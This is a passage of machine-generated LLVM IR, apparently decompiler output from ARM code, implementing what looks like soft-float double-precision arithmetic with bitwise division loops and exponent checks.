  %storemerge = phi i32 [ -2147483648, %dec_label_pc_17dbc ], [ 524288, %dec_label_pc_17d0c ]
  store i32 %storemerge133, i32* %r0.global-to-local, align 4
  store i32 %storemerge, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_17d24

dec_label_pc_17d24:                               ; preds = %dec_label_pc_17d24.outer, %dec_label_pc_17d94
  %v1_17d8859 = phi i32 [ %v2_17dd0, %dec_label_pc_17d94 ], [ %storemerge133, %dec_label_pc_17d24.outer ]
  %v1_17d34 = phi i32 [ %v1_17d3432, %dec_label_pc_17d94 ], [ %storemerge133, %dec_label_pc_17d24.outer ]
  %v1_17d5041 = phi i32 [ %v1_17d5043, %dec_label_pc_17d94 ], [ %storemerge133, %dec_label_pc_17d24.outer ]
  %v1_17d6c50 = phi i32 [ %v1_17d6c52, %dec_label_pc_17d94 ], [ %storemerge133, %dec_label_pc_17d24.outer ]
  %v0_17dac = phi i32 [ %v3_17dac, %dec_label_pc_17d94 ], [ %storemerge, %dec_label_pc_17d24.outer ]
  %v0_17d28 = phi i32 [ %v5_17d98, %dec_label_pc_17d94 ], [ %v0_17d28.ph, %dec_label_pc_17d24.outer ]
  %v1_17d2c = phi i32 [ %v3_17d9c, %dec_label_pc_17d94 ], [ %v1_17d2c.ph, %dec_label_pc_17d24.outer ]
  %v5_17da417 = phi i32 [ %v5_17da4, %dec_label_pc_17d94 ], [ %v5_17da417.ph, %dec_label_pc_17d24.outer ]
  %v3_17da813 = phi i32 [ %v3_17da8, %dec_label_pc_17d94 ], [ %v3_17da813.ph, %dec_label_pc_17d24.outer ]
  %v3_17d24 = icmp uge i32 %v1_17d2c, %v3_17da813
  %v3_17d28 = icmp eq i1 %v3_17d24, false
  %v4_17d28 = sub i32 %v0_17d28, %v5_17da417
  %v6_17d28 = sext i1 %v3_17d28 to i32
  %v7_17d28 = add i32 %v6_17d28, %v4_17d28
  %v8_17d28 = zext i1 %v3_17d28 to i32
  %v9_17d28 = sub i32 %v7_17d28, %v8_17d28
  %v10_17d28 = icmp ult i32 %v0_17d28, %v9_17d28
  %v11_17d28 = icmp ne i32 %v5_17da417, -1
  %v12_17d28 = or i1 %v11_17d28, %v10_17d28
  %v13_17d28 = icmp ult i32 %v0_17d28, %v5_17da417
  %v14_17d28 = select i1 %v3_17d28, i1 %v12_17d28, i1 %v13_17d28
  br i1 %v14_17d28, label %.thread4, label %bb96

bb96:                                             ; preds = %dec_label_pc_17d24
  %v3_17d2c = sub i32 %v1_17d2c, %v3_17da813
  store i32 %v3_17d2c, i32* %r6.global-to-local, align 4
  store i32 %v7_17d28, i32* %r5.global-to-local, align 4
  %v3_17d34 = or i32 %v1_17d34, %v0_17dac
  store i32 %v3_17d34, i32* %r0.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_17d24, %bb96
  %v1_17d8858 = phi i32 [ %v1_17d8859, %dec_label_pc_17d24 ], [ %v3_17d34, %bb96 ]
  %v1_17d3435 = phi i32 [ %v1_17d34, %dec_label_pc_17d24 ], [ %v3_17d34, %bb96 ]
  %v1_17d50 = phi i32 [ %v1_17d5041, %dec_label_pc_17d24 ], [ %v3_17d34, %bb96 ]
  %v1_17d6c49 = phi i32 [ %v1_17d6c50, %dec_label_pc_17d24 ], [ %v3_17d34, %bb96 ]
  %v0_17d44 = phi i32 [ %v0_17d28, %dec_label_pc_17d24 ], [ %v7_17d28, %bb96 ]
  %v1_17d48 = phi i32 [ %v1_17d2c, %dec_label_pc_17d24 ], [ %v3_17d2c, %bb96 ]
  %v1_17d38 = urem i32 %v5_17da417, 2
  %v2_17d38 = icmp ne i32 %v1_17d38, 0
  %v3_17d38 = udiv i32 %v5_17da417, 2
  %v3_17d3c = zext i1 %v2_17d38 to i32
  %v6_17d3c = zext i32 %v3_17da813 to i64
  %v7_17d3c = sub i32 33, %v3_17da813
  %v8_17d3c = zext i32 %v7_17d3c to i64
  %v9_17d3c = shl i64 %v6_17d3c, %v8_17d3c
  %v10_17d3c = sub i32 32, %v3_17da813
  %v11_17d3c = shl i32 %v3_17d3c, %v10_17d3c
  %v12_17d3c = zext i32 %v11_17d3c to i64
  %v14_17d3c = or i64 %v12_17d3c, %v9_17d3c
  %v15_17d3c = trunc i64 %v14_17d3c to i32
  %v3_17d40 = icmp uge i32 %v1_17d48, %v15_17d3c
  %v3_17d44 = icmp eq i1 %v3_17d40, false
  %v4_17d44 = sub i32 %v0_17d44, %v3_17d38
  %v6_17d44 = sext i1 %v3_17d44 to i32
  %v7_17d44 = add i32 %v6_17d44, %v4_17d44
  %v13_17d44 = icmp ult i32 %v0_17d44, %v3_17d38
  %v14_17d44 = or i1 %v13_17d44, %v3_17d44
  br i1 %v14_17d44, label %.thread6, label %bb97

bb97:                                             ; preds = %.thread4
  %v3_17d48 = sub i32 %v1_17d48, %v15_17d3c
  store i32 %v3_17d48, i32* %r6.global-to-local, align 4
  store i32 %v7_17d44, i32* %r5.global-to-local, align 4
  %v5_17d50 = udiv i32 %v0_17dac, 2
  %v6_17d50 = or i32 %v1_17d50, %v5_17d50
  store i32 %v6_17d50, i32* %r0.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %.thread4, %bb97
  %v1_17d8857 = phi i32 [ %v1_17d8858, %.thread4 ], [ %v6_17d50, %bb97 ]
  %v1_17d3434 = phi i32 [ %v1_17d3435, %.thread4 ], [ %v6_17d50, %bb97 ]
  %v1_17d5045 = phi i32 [ %v1_17d50, %.thread4 ], [ %v6_17d50, %bb97 ]
  %v1_17d6c = phi i32 [ %v1_17d6c49, %.thread4 ], [ %v6_17d50, %bb97 ]
  %v0_17d60 = phi i32 [ %v0_17d44, %.thread4 ], [ %v7_17d44, %bb97 ]
  %v1_17d64 = phi i32 [ %v1_17d48, %.thread4 ], [ %v3_17d48, %bb97 ]
  %v1_17d54 = urem i32 %v3_17d38, 2
  %v2_17d54 = icmp ne i32 %v1_17d54, 0
  %v3_17d54 = udiv i32 %v5_17da417, 4
  %v3_17d58 = zext i1 %v2_17d54 to i32
  %v6_17d58 = and i64 %v14_17d3c, 4294967295
  %v7_17d58 = sub i32 33, %v15_17d3c
  %v8_17d58 = zext i32 %v7_17d58 to i64
  %v9_17d58 = shl i64 %v6_17d58, %v8_17d58
  %v10_17d58 = sub i32 32, %v15_17d3c
  %v11_17d58 = shl i32 %v3_17d58, %v10_17d58
  %v12_17d58 = zext i32 %v11_17d58 to i64
  %v14_17d58 = or i64 %v12_17d58, %v9_17d58
  %v15_17d58 = trunc i64 %v14_17d58 to i32
  %v3_17d5c = icmp uge i32 %v1_17d64, %v15_17d58
  %v3_17d60 = icmp eq i1 %v3_17d5c, false
  %v4_17d60 = sub i32 %v0_17d60, %v3_17d54
  %v6_17d60 = sext i1 %v3_17d60 to i32
  %v7_17d60 = add i32 %v6_17d60, %v4_17d60
  %v13_17d60 = icmp ult i32 %v0_17d60, %v3_17d54
  %v14_17d60 = or i1 %v13_17d60, %v3_17d60
  br i1 %v14_17d60, label %.thread8, label %bb98

bb98:                                             ; preds = %.thread6
  %v3_17d64 = sub i32 %v1_17d64, %v15_17d58
  store i32 %v3_17d64, i32* %r6.global-to-local, align 4
  store i32 %v7_17d60, i32* %r5.global-to-local, align 4
  %v5_17d6c = udiv i32 %v0_17dac, 4
  %v6_17d6c = or i32 %v1_17d6c, %v5_17d6c
  store i32 %v6_17d6c, i32* %r0.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %.thread6, %bb98
  %v1_17d88 = phi i32 [ %v1_17d8857, %.thread6 ], [ %v6_17d6c, %bb98 ]
  %v1_17d3433 = phi i32 [ %v1_17d3434, %.thread6 ], [ %v6_17d6c, %bb98 ]
  %v1_17d5044 = phi i32 [ %v1_17d5045, %.thread6 ], [ %v6_17d6c, %bb98 ]
  %v1_17d6c53 = phi i32 [ %v1_17d6c, %.thread6 ], [ %v6_17d6c, %bb98 ]
  %v0_17d7c = phi i32 [ %v0_17d60, %.thread6 ], [ %v7_17d60, %bb98 ]
  %v1_17d80 = phi i32 [ %v1_17d64, %.thread6 ], [ %v3_17d64, %bb98 ]
  %v1_17d70 = urem i32 %v3_17d54, 2
  %v2_17d70 = icmp ne i32 %v1_17d70, 0
  %v3_17d70 = udiv i32 %v5_17da417, 8
  %v3_17d74 = zext i1 %v2_17d70 to i32
  %v6_17d74 = and i64 %v14_17d58, 4294967295
  %v7_17d74 = sub i32 33, %v15_17d58
  %v8_17d74 = zext i32 %v7_17d74 to i64
  %v9_17d74 = shl i64 %v6_17d74, %v8_17d74
  %v10_17d74 = sub i32 32, %v15_17d58
  %v11_17d74 = shl i32 %v3_17d74, %v10_17d74
  %v12_17d74 = zext i32 %v11_17d74 to i64
  %v14_17d74 = or i64 %v12_17d74, %v9_17d74
  %v15_17d74 = trunc i64 %v14_17d74 to i32
  %v3_17d78 = icmp uge i32 %v1_17d80, %v15_17d74
  %v3_17d7c = icmp eq i1 %v3_17d78, false
  %v4_17d7c = sub i32 %v0_17d7c, %v3_17d70
  %v6_17d7c = sext i1 %v3_17d7c to i32
  %v7_17d7c = add i32 %v6_17d7c, %v4_17d7c
  %v13_17d7c = icmp ult i32 %v0_17d7c, %v3_17d70
  %v14_17d7c = or i1 %v13_17d7c, %v3_17d7c
  br i1 %v14_17d7c, label %.thread10, label %bb100

bb100:                                            ; preds = %.thread8
  %v3_17d80 = sub i32 %v1_17d80, %v15_17d74
  store i32 %v3_17d80, i32* %r6.global-to-local, align 4
  store i32 %v7_17d7c, i32* %r5.global-to-local, align 4
  %v5_17d88 = udiv i32 %v0_17dac, 8
  %v6_17d88 = or i32 %v1_17d88, %v5_17d88
  store i32 %v6_17d88, i32* %r0.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread8, %bb100
  %v1_17d98 = phi i32 [ %v1_17d80, %.thread8 ], [ %v3_17d80, %bb100 ]
  %v0_17d94 = phi i32 [ %v0_17d7c, %.thread8 ], [ %v7_17d7c, %bb100 ]
  %v2_17dd0 = phi i32 [ %v1_17d88, %.thread8 ], [ %v6_17d88, %bb100 ]
  %v1_17d3432 = phi i32 [ %v1_17d3433, %.thread8 ], [ %v6_17d88, %bb100 ]
  %v1_17d5043 = phi i32 [ %v1_17d5044, %.thread8 ], [ %v6_17d88, %bb100 ]
  %v1_17d6c52 = phi i32 [ %v1_17d6c53, %.thread8 ], [ %v6_17d88, %bb100 ]
  %v2_17d8c = or i32 %v0_17d94, %v1_17d98
  %v4_17d8c = icmp eq i32 %v2_17d8c, 0
  br i1 %v4_17d8c, label %dec_label_pc_17dcc, label %dec_label_pc_17d94

dec_label_pc_17d94:                               ; preds = %.thread10
  %v3_17d94 = mul i32 %v0_17d94, 16
  %v4_17d98 = udiv i32 %v1_17d98, 268435456
  %v5_17d98 = or i32 %v3_17d94, %v4_17d98
  store i32 %v5_17d98, i32* %r5.global-to-local, align 4
  %v3_17d9c = mul i32 %v1_17d98, 16
  store i32 %v3_17d9c, i32* %r6.global-to-local, align 4
  %v3_17da0 = mul nuw i32 %v3_17d70, 8
  %v4_17da4 = udiv i32 %v15_17d74, 536870912
  %v5_17da4 = or i32 %v4_17da4, %v3_17da0
  %v3_17da8 = mul i32 %v15_17d74, 8
  %v3_17dac = udiv i32 %v0_17dac, 16
  store i32 %v3_17dac, i32* %ip.global-to-local, align 4
  %tmp = icmp ult i32 %v0_17dac, 16
  br i1 %tmp, label %dec_label_pc_17db4, label %dec_label_pc_17d24

dec_label_pc_17db4:                               ; preds = %dec_label_pc_17d94
  %v1_17db4 = and i32 %v1_17dd0.ph, 1048576
  %v2_17db4 = icmp eq i32 %v1_17db4, 0
  br i1 %v2_17db4, label %dec_label_pc_17dbc, label %.thread11.loopexit

dec_label_pc_17dbc:                               ; preds = %dec_label_pc_17db4
  %v2_17dbc = or i32 %v2_17dd0, %v1_17dd0.ph
  store i32 %v2_17dbc, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17d24.outer

dec_label_pc_17dcc:                               ; preds = %.thread10
  store i32 %v15_17d74, i32* %r2.global-to-local, align 4
  store i32 %v3_17d70, i32* %r3.global-to-local, align 4
  %v1_17dcc = and i32 %v1_17dd0.ph, 1048576
  %v2_17dcc = icmp eq i32 %v1_17dcc, 0
  br i1 %v2_17dcc, label %bb101, label %.thread11

bb101:                                            ; preds = %dec_label_pc_17dcc
  %v3_17dd0 = or i32 %v2_17dd0, %v1_17dd0.ph
  store i32 %v3_17dd0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread11

.thread11.loopexit:                               ; preds = %dec_label_pc_17db4
  store i32 %v3_17da8, i32* %r2.global-to-local, align 4
  store i32 %v5_17da4, i32* %r3.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %.thread11.loopexit, %dec_label_pc_17dcc, %bb101
  %v1_17dd8 = add nsw i32 %v4_17cf8, 515
  store i32 %v1_17dd8, i32* %ip.global-to-local, align 4
  %v2_17dd8 = icmp ugt i32 %v1_17cfc, 252
  %v7_17dd8 = icmp eq i32 %v1_17cfc, 253
  %v2_17ddc = xor i1 %v7_17dd8, true
  %v3_17ddc = and i1 %v2_17dd8, %v2_17ddc
  br i1 %v3_17ddc, label %bb102, label %bb103

bb102:                                            ; preds = %.thread11
  %v6_17ddc = icmp ugt i32 %v1_17dd8, 1791
  %v11_17ddc = icmp eq i32 %v1_17dd8, 1792
  br label %bb103

bb103:                                            ; preds = %.thread11, %bb102
  %v1_17de0 = phi i1 [ %v7_17dd8, %.thread11 ], [ %v11_17ddc, %bb102 ]
  %v0_17de0 = phi i1 [ %v2_17dd8, %.thread11 ], [ %v6_17ddc, %bb102 ]
  %v2_17de0 = xor i1 %v1_17de0, true
  %v3_17de0 = and i1 %v0_17de0, %v2_17de0
  call void @__pseudo_cond_branch(i1 %v3_17de0, i32 ptrtoint (i32* @global_var_17af4.696 to i32))
  %v0_17de4 = load i32, i32* %r5.global-to-local, align 4
  %v1_17de4 = load i32, i32* %r3.global-to-local, align 4
  %v2_17de4 = sub i32 %v0_17de4, %v1_17de4
  store i32 %v2_17de4, i32* %ip.global-to-local, align 4
  %v3_17de4 = icmp uge i32 %v0_17de4, %v1_17de4
  %v9_17de4 = icmp eq i32 %v0_17de4, %v1_17de4
  br i1 %v9_17de4, label %bb104, label %.thread12

bb104:                                            ; preds = %bb103
  %v1_17de8 = load i32, i32* %r6.global-to-local, align 4
  %v2_17de8 = load i32, i32* %r2.global-to-local, align 4
  %v3_17de8 = sub i32 %v1_17de8, %v2_17de8
  store i32 %v3_17de8, i32* %ip.global-to-local, align 4
  %v4_17de8 = icmp uge i32 %v1_17de8, %v2_17de8
  %v10_17de8 = icmp eq i32 %v1_17de8, %v2_17de8
  br i1 %v10_17de8, label %bb105, label %.thread12

bb105:                                            ; preds = %bb104
  %v1_17dec = load i32, i32* %r0.global-to-local, align 4
  %v2_17dec = urem i32 %v1_17dec, 2
  %v3_17dec = icmp ne i32 %v2_17dec, 0
  %v4_17dec = udiv i32 %v1_17dec, 2
  store i32 %v4_17dec, i32* %ip.global-to-local, align 4
  br label %.thread12

.thread12:                                        ; preds = %bb103, %bb104, %bb105
  %v1_17df0 = phi i1 [ %v3_17de4, %bb103 ], [ %v4_17de8, %bb104 ], [ %v3_17dec, %bb105 ]
  %v0_17df0 = load i32, i32* %r0.global-to-local, align 4
  %v2_17df0 = zext i1 %v1_17df0 to i32
  %v3_17df0 = add i32 %v2_17df0, %v0_17df0
  store i32 %v3_17df0, i32* %r0.global-to-local, align 4
  %v0_17df4 = load i32, i32* %r1.global-to-local, align 4
  %v1_17df4 = load i32, i32* %r4.global-to-local, align 4
  %v2_17df4 = and i32 %v1_17df4, 4096
  %v3_17df4 = icmp ne i32 %v2_17df4, 0
  %v4_17df4 = mul i32 %v1_17df4, 1048576
  %v6_17df4 = add i32 %v4_17df4, %v0_17df4
  %v7_17df4 = zext i1 %v3_17df4 to i32
  %v8_17df4 = add i32 %v7_17df4, %v6_17df4
  store i32 %v8_17df4, i32* %r1.global-to-local, align 4
  %v2_17df8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_17df8, i32* %r4.global-to-local, align 4
  store i32 %v6_17c98, i32* %r5.global-to-local, align 4
  store i32 %v9_17c98, i32* %r6.global-to-local, align 4
  ret i32 %v3_17df0

dec_label_pc_17e00:                               ; preds = %dec_label_pc_17cb8
  %v1_17e00 = and i32 %v2_17cbc, -2147483648
  %v4_17e04 = urem i32 %v1_17ca4, 1048576
  %v5_17e04 = or i32 %v1_17e00, %v4_17e04
  store i32 %v5_17e04, i32* %r1.global-to-local, align 4
  %v6_17e08 = add nsw i32 %v2_17cb8, 1023
  store i32 %v6_17e08, i32* %r4.global-to-local, align 4
  %v8_17e08 = sub nsw i32 0, %v2_17cb8
  %v9_17e08 = and i32 %v6_17e08, %v8_17e08
  %v11_17e08 = icmp slt i32 %v2_17cb8, -1023
  %v12_17e08 = icmp eq i32 %v6_17e08, 0
  %v7_17e0c = icmp sgt i32 %v2_17cb8, -1023
  br i1 %v7_17e0c, label %bb106, label %bb107

bb106:                                            ; preds = %dec_label_pc_17e00
  %v10_17e0c = sub nsw i32 1024, %v2_17cb8
  store i32 %v10_17e0c, i32* %r5.global-to-local, align 4
  %v14_17e0c = and i32 %v10_17e0c, %v6_17e08
  %v16_17e0c = icmp slt i32 %v10_17e0c, 0
  %v17_17e0c = icmp eq i32 %v6_17e08, 2047
  br label %bb107

bb107:                                            ; preds = %dec_label_pc_17e00, %bb106
  %v3_17e18.in = phi i32 [ %v9_17e08, %dec_label_pc_17e00 ], [ %v14_17e0c, %bb106 ]
  %v2_17e18 = phi i1 [ %v11_17e08, %dec_label_pc_17e00 ], [ %v16_17e0c, %bb106 ]
  %v1_17e18 = phi i1 [ %v12_17e08, %dec_label_pc_17e00 ], [ %v17_17e0c, %bb106 ]
  %v3_17e18 = icmp slt i32 %v3_17e18.in, 0
  %v3_17e10 = xor i1 %v3_17e18, %v2_17e18
  %v4_17e10 = or i1 %v1_17e18, %v3_17e10
  br i1 %v4_17e10, label %.thread, label %bb108

bb108:                                            ; preds = %bb107
  %v9_17e1084 = mul i32 %v6_17e08, 1048576
  %v10_17e1085 = or i32 %v9_17e1084, %v5_17e04
  store i32 %v10_17e1085, i32* %r1.global-to-local, align 4
  store i32 %v3_17c98, i32* %r4.global-to-local, align 4
  store i32 %v6_17c98, i32* %r5.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %bb107, %bb108
  %v0_17e18 = phi i32 [ %v12_17c98, %bb108 ], [ %v1_17e00, %bb107 ]
  %v6_17e18 = xor i1 %v4_17e10, true
  call void @__pseudo_cond_branch(i1 %v6_17e18, i32 %v0_17e18)
  %v0_17e1c = load i32, i32* %r1.global-to-local, align 4
  %v1_17e1c = or i32 %v0_17e1c, 1048576
  store i32 %v1_17e1c, i32* @r1, align 4
  %v0_17e24 = load i32, i32* %r4.global-to-local, align 4
  %v1_17e24 = add i32 %v0_17e24, -1
  store i32 %v1_17e24, i32* @r4, align 4
  %v3_17e24 = sub i32 0, %v0_17e24
  %v4_17e24 = and i32 %v0_17e24, %v3_17e24
  %v5_17e24 = icmp slt i32 %v4_17e24, 0
  store i1 %v5_17e24, i1* @cpsr_v, align 1
  %v6_17e24 = icmp slt i32 %v1_17e24, 0
  store i1 %v6_17e24, i1* @cpsr_n, align 1
  %v7_17e24 = icmp eq i32 %v0_17e24, 1
  store i1 %v7_17e24, i1* @cpsr_z, align 1
  %v0_17e28 = call i32 @function_17af4()
  store i32 %v0_17e28, i32* @r0, align 4
  %v0_17e30 = call i32 @function_17af4()
  store i32 %v0_17e30, i32* @r0, align 4
  %v0_17e34.pre = load i32, i32* %ip.global-to-local, align 4
  %v0_17e38.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_17e34

dec_label_pc_17e34:                               ; preds = %.thread1, %.thread2, %bb91, %.thread
  %v4_17e34.pre-phi = phi i32 [ %v5_17ca8, %.thread1 ], [ %.pre145.pre-phi, %.thread2 ], [ %v5_17ca8, %bb91 ], [ %v5_17ca8, %.thread ]
  %v0_17e38 = phi i32 [ %v5_17ca4, %.thread1 ], [ %v5_17ca4, %.thread2 ], [ %v5_17ca4, %bb91 ], [ %v0_17e38.pre, %.thread ]
  %v2_17e3c = phi i32 [ 2047, %.thread1 ], [ 2047, %.thread2 ], [ 2047, %bb91 ], [ %v0_17e34.pre, %.thread ]
  %v5_17e34 = and i32 %v2_17e3c, %v4_17e34.pre-phi
  store i32 %v5_17e34, i32* @r5, align 4
  %v4_17e38 = icmp eq i32 %v2_17e3c, %v0_17e38
  br i1 %v4_17e38, label %bb109, label %bb110

bb109:                                            ; preds = %dec_label_pc_17e34
  %v5_17e3c = icmp eq i32 %v5_17e34, %v2_17e3c
  br label %bb110

bb110:                                            ; preds = %dec_label_pc_17e34, %bb109
  %v0_17e40 = phi i1 [ false, %dec_label_pc_17e34 ], [ %v5_17e3c, %bb109 ]
  call void @__pseudo_cond_branch(i1 %v0_17e40, i32 ptrtoint (i32* @global_var_17c88.698 to i32))
  %v0_17e44 = load i32, i32* @r4, align 4
  %v1_17e44 = load i32, i32* %ip.global-to-local, align 4
  %v4_17e44 = icmp eq i32 %v1_17e44, %v0_17e44
  br i1 %v4_17e44, label %dec_label_pc_17e4c, label %dec_label_pc_17e68

dec_label_pc_17e4c:                               ; preds = %bb110
  %v0_17e4c = load i32, i32* @r0, align 4
  %v1_17e4c = load i32, i32* @r1, align 4
  %v4_17e4c = mul i32 %v1_17e4c, 4096
  %v5_17e4c = or i32 %v4_17e4c, %v0_17e4c
  store i32 %v5_17e4c, i32* %r4.global-to-local, align 4
  %v1_17e50 = icmp ne i32 %v5_17e4c, 0
  call void @__pseudo_cond_branch(i1 %v1_17e50, i32 ptrtoint (i32* @global_var_17c88.698 to i32))
  %v0_17e54 = load i32, i32* @r5, align 4
  %v1_17e54 = load i32, i32* %ip.global-to-local, align 4
  %v1_17e58 = icmp ne i32 %v1_17e54, %v0_17e54
  call void @__pseudo_cond_branch(i1 %v1_17e58, i32 ptrtoint (i32* @global_var_17c6c.699 to i32))
  store i32 %arg3, i32* @r0, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v2_17e64 = call i32 @function_17c88(i32 %arg3, i32 %arg4)
  store i32 %v2_17e64, i32* @r0, align 4
  %v1_17e68.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_17e68

dec_label_pc_17e68:                               ; preds = %bb110, %dec_label_pc_17e4c
  %v1_17e68 = phi i32 [ %v1_17e44, %bb110 ], [ %v1_17e68.pre, %dec_label_pc_17e4c ]
  %v0_17e68 = load i32, i32* @r5, align 4
  %v4_17e68 = icmp eq i32 %v0_17e68, %v1_17e68
  br i1 %v4_17e68, label %dec_label_pc_17e70, label %dec_label_pc_17e68.dec_label_pc_17e84_crit_edge

dec_label_pc_17e68.dec_label_pc_17e84_crit_edge:  ; preds = %dec_label_pc_17e68
  %v0_17e84.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_17e84

dec_label_pc_17e70:                               ; preds = %dec_label_pc_17e68
  %v4_17e70 = mul i32 %arg4, 4096
  %v5_17e70 = or i32 %v4_17e70, %arg3
  store i32 %v5_17e70, i32* %r5.global-to-local, align 4
  %v7_17e70 = icmp eq i32 %v5_17e70, 0
  call void @__pseudo_cond_branch(i1 %v7_17e70, i32 ptrtoint (i32* @global_var_17c1c.700 to i32))
  store i32 %arg3, i32* @r0, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v2_17e80 = call i32 @function_17c88(i32 %arg3, i32 %arg4)
  store i32 %v2_17e80, i32* @r0, align 4
  br label %dec_label_pc_17e84

dec_label_pc_17e84:                               ; preds = %dec_label_pc_17e68.dec_label_pc_17e84_crit_edge, %dec_label_pc_17e70
  %v0_17e84 = phi i32 [ %v0_17e84.pre, %dec_label_pc_17e68.dec_label_pc_17e84_crit_edge ], [ %v2_17e80, %dec_label_pc_17e70 ]
  %v1_17e84 = load i32, i32* @r1, align 4
  %v3_17e84 = mul i32 %v1_17e84, 2
  %v4_17e84 = or i32 %v3_17e84, %v0_17e84
  store i32 %v4_17e84, i32* %r6.global-to-local, align 4
  %v6_17e84 = icmp eq i32 %v4_17e84, 0
  br i1 %v6_17e84, label %dec_label_pc_17e84._crit_edge, label %bb111

dec_label_pc_17e84._crit_edge:                    ; preds = %dec_label_pc_17e84
  %.pre = mul i32 %arg4, 2
  %.pre80 = or i32 %.pre, %arg3
  br label %bb112

bb111:                                            ; preds = %dec_label_pc_17e84
  %v4_17e88 = mul i32 %arg4, 2
  %v5_17e88 = or i32 %v4_17e88, %arg3
  store i32 %v5_17e88, i32* %r6.global-to-local, align 4
  %phitmp = icmp ne i32 %v5_17e88, 0
  br label %bb112

bb112:                                            ; preds = %dec_label_pc_17e84._crit_edge, %bb111
  %v4_17e98.pre-phi = phi i32 [ %.pre80, %dec_label_pc_17e84._crit_edge ], [ %v5_17e88, %bb111 ]
  %v0_17e8c = phi i1 [ false, %dec_label_pc_17e84._crit_edge ], [ %phitmp, %bb111 ]
  call void @__pseudo_cond_branch(i1 %v0_17e8c, i32 ptrtoint (i32* @global_var_17bb4.701 to i32))
  %v0_17e90 = load i32, i32* @r0, align 4
  %v1_17e90 = load i32, i32* @r1, align 4
  %v3_17e90 = mul i32 %v1_17e90, 2
  %v4_17e90 = or i32 %v3_17e90, %v0_17e90
  store i32 %v4_17e90, i32* %r4.global-to-local, align 4
  %v1_17e94 = icmp ne i32 %v4_17e90, 0
  call void @__pseudo_cond_branch(i1 %v1_17e94, i32 ptrtoint (i32* @global_var_17c6c.699 to i32))
  store i32 %v4_17e98.pre-phi, i32* %r5.global-to-local, align 4
  %v1_17e9c = icmp ne i32 %v4_17e98.pre-phi, 0
  call void @__pseudo_cond_branch(i1 %v1_17e9c, i32 ptrtoint (i32* @global_var_17c1c.700 to i32))
  %v0_17ea0 = load i32, i32* @r0, align 4
  %v1_17ea0 = load i32, i32* @r1, align 4
  %v2_17ea0 = call i32 @function_17c88(i32 %v0_17ea0, i32 %v1_17ea0)
  store i32 %v2_17ea0, i32* %r0.global-to-local, align 4
  ret i32 %v2_17ea0

; uselistorder directives
  uselistorder i32 %v5_17e88, { 1, 0, 2 }
  uselistorder i32 %v1_17e44, { 1, 0 }
  uselistorder i32 %v1_17e24, { 1, 0 }
  uselistorder i32 %v0_17e24, { 3, 1, 0, 2 }
  uselistorder i32 %v10_17e0c, { 2, 0, 1 }
  uselistorder i32 %v6_17e08, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v1_17e00, { 1, 0 }
  uselistorder i32 %v2_17de8, { 1, 0, 2 }
  uselistorder i32 %v1_17de8, { 1, 0, 2 }
  uselistorder i32 %v1_17de4, { 1, 0, 2 }
  uselistorder i32 %v0_17de4, { 1, 0, 2 }
  uselistorder i1 %v7_17dd8, { 1, 0 }
  uselistorder i32 %v2_17dbc, { 1, 0 }
  uselistorder i32 %v3_17da8, { 2, 1, 0 }
  uselistorder i32 %v3_17d9c, { 0, 2, 1 }
  uselistorder i32 %v5_17d98, { 2, 0, 1 }
  uselistorder i32 %v6_17d88, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_17d74, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v3_17d70, { 3, 0, 2, 1 }
  uselistorder i32 %v0_17d7c, { 0, 2, 1 }
  uselistorder i32 %v1_17d88, { 1, 0 }
  uselistorder i32 %v6_17d6c, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_17d58, { 1, 2, 0, 3 }
  uselistorder i32 %v3_17d54, { 0, 2, 1 }
  uselistorder i32 %v0_17d60, { 0, 2, 1 }
  uselistorder i32 %v1_17d6c, { 1, 0 }
  uselistorder i32 %v6_17d50, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_17d3c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_17d44, { 0, 2, 1 }
  uselistorder i32 %v1_17d50, { 1, 0 }
  uselistorder i32 %v3_17d34, { 2, 1, 0, 3, 4 }
  uselistorder i1 %v3_17d28, { 1, 2, 0 }
  uselistorder i32 %v3_17da813, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v5_17da417, { 0, 1, 2, 3, 5, 6, 4 }
  uselistorder i32 %v0_17d28, { 0, 3, 2, 1 }
  uselistorder i32 %v1_17d34, { 1, 0 }
  uselistorder i32 %storemerge133, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_17dd0.ph, { 1, 0, 3, 2 }
  uselistorder i32 %v3_17d14, { 1, 0 }
  uselistorder i32 %v0_17d18, { 1, 0 }
  uselistorder i32 %v3_17d04, { 1, 0 }
  uselistorder i1 %v1_17cf8, { 1, 0 }
  uselistorder i32 %v3_17ce8, { 2, 3, 1, 0 }
  uselistorder i32 %v5_17ce4, { 3, 2, 1, 0 }
  uselistorder i32 %v3_17cdc, { 2, 1, 0 }
  uselistorder i32 %v5_17cd8, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_17cb8, { 3, 1, 2, 0, 4, 7, 6, 5, 8 }
  uselistorder i32 %v6_17ca8, { 2, 3, 1, 0 }
  uselistorder i32 %v5_17ca8, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v5_17ca4, { 5, 4, 3, 2, 6, 1, 0 }
  uselistorder i32 %v1_17ca4, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v6_17c98, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 9, 10, 0, 6, 1, 2, 3, 4, 5, 7, 8 }
  uselistorder i32* %r5.global-to-local, { 13, 14, 0, 1, 2, 8, 3, 4, 5, 6, 7, 9, 10, 11, 12 }
